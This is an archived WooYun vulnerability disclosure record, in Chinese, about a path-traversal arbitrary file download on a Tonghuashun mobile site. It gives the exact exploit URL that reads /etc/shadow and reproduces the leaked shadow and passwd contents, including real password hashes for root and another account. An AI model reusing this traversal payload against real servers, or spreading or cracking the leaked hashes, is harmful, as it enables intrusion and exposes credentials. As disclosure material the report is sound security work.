{"id": 9791, "wybug_id": "wooyun-2013-036242", "wybug_title": "同花顺某站系统文件任意下载（root权限导致shadow、passwd等文件下载）", "wybug_corp": "同花顺", "wybug_author": "霍大然", "wybug_date": "2013-09-06 10:17", "wybug_open_date": "2013-09-11 10:17", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 同花顺某站系统文件任意下载（root权限导致shadow、passwd等文件），root的hash出来了 详细说明：  问题站点：http://wap.hexin.cn\n\n下载shadow文件的url：http://wap.hexin.cn/dlxhtml/download.php?bid=4528&bname=%E9%80%9A%E7%94%A8%E5%8C%BA&fn=../../../../../../../../../../etc/shadow&mid=70&mname=iPad，直接可以下载，内容如下：root:$1$lwaevE8W$u.TIDGpDOH2sEMzjjqlRP.:15512:0:99999:7:::bin:*:14627:0:99999:7:::daemon:*:14627:0:99999:7:::adm:*:14627:0:99999:7:::lp:*:14627:0:99999:7:::sync:*:14627:0:99999:7:::shutdown:*:14627:0:99999:7:::halt:*:14627:0:99999:7:::mail:*:14627:0:99999:7:::news:*:14627:0:99999:7:::uucp:*:14627:0:99999:7:::operator:*:14627:0:99999:7:::games:*:14627:0:99999:7:::gopher:*:14627:0:99999:7:::ftp:*:14627:0:99999:7:::nobody:*:14627:0:99999:7:::nscd:!!:14627:0:99999:7:::vcsa:!!:14627:0:99999:7:::rpc:!!:14627:0:99999:7:::mailnull:!!:14627:0:99999:7:::smmsp:!!:14627:0:99999:7:::apache:!!:14627:0:99999:7:::ais:!!:14627:0:99999:7:::pcap:!!:14627:0:99999:7:::luci:!!:14627:0:99999:7:::dbus:!!:14627:0:99999:7:::avahi:!!:14627:0:99999:7:::pegasus:!!:14627:0:99999:7:::sshd:!!:14627:0:99999:7:::rpcuser:!!:14627:0:99999:7:::nfsnobody:!!:14627:0:99999:7:::ricci:!!:14627:0:99999:7:::haldaemon:!!:14627:0:99999:7:::avahi-autoipd:!!:14627:0:99999:7:::xfs:!!:14627:0:99999:7:::mysql:!!:14706::::::ntp:!!:14714::::::update:$1$3vBQzS76$n6zU/lreAYj/iTO9BmBFC.:15567:0:99999:7:::下载passwd文件的url:http://wap.hexin.cn/dlxhtml/download.php?bid=4528&bname=%E9%80%9A%E7%94%A8%E5%8C%BA&fn=../../../../../../../../../../etc/shadow&mid=70&mname=iPadroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinais:x:39:39:openais Standards Based Cluster Framework:/:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinluci:x:100:101::/var/lib/luci:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinpegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinricci:x:101:103:ricci daemon user:/var/lib/ricci:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:102:104:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashntp:x:38:38::/etc/ntp:/sbin/nologinupdate:x:505:506::/usr/local/apache/htdocs/waphtml:/bin/bash   漏洞证明：  想看什么文件自己下载   修复方案：  1、增加download的过滤；2、改权限，不能用root；   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-09-11 10:17 厂商回复：  最新状态： 2014-11-06：已经修复，谢谢  ", "replys": "漏洞评价：\n评论\n     2013-09-10 19:52 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @同花顺 你都修复了，也给我确认下吧    \n     2013-09-11 09:06 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  @霍大然 不一定是官方修的。。    \n     2014-11-06 14:23 |    \t\t同花顺(乌云厂商)\t\t \n  @霍大然 恩啊，我来确认下，谢谢~    \n     2014-11-10 21:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @同花顺 忽略了啊？点错了？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}